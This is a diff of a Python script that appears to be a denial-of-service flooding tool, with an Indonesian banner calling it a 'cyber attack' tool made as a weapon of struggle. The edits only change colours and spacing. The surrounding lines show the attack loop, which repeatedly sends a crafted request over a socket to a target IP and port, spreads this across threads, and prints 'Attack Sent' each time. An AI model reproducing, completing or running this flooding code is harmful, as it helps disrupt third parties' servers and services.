@@ -77,7 +77,7 @@ print("\033[96m        ⟩⟩  CYBER ATTACK PEOPLE \033[0m "),
 time.sleep(5),
 print("\033[92m        ⟩⟩  SCRIPT INI DIBUAT \033[0m "),
 time.sleep(5),
-print("\033[1m        ⟩⟩   SEBAGAI ALAT PERJUANGAN \033[0m "),
+print("\033[1m        ⟩⟩  SEBAGAI ALAT PERJUANGAN \033[0m "),
 time.sleep(5),
 print("\033[97m        ⟩⟩  DIAKIBATKAN KESEWENANGAN \033[0m "),
 time.sleep(5),
@@ -102,11 +102,11 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[34m[★\033[34m]  \033[34m[CAT]  \033[92m[Attack Sent]  \033[31m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[34m[★\033[31m]  \033[31m[CAT]  \033[37m[Attack Sent]  \033[94m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                 s.close()
-                print("[x]  \033[34m[CAT]  \033[92m[Attack Sent]  \033[31m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("[x]  \033[31m[CAT]  \033[37m[Attack Sent]  \033[94m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
                     
 for x in range(thread):
     thred = threading.Thread(target=start)
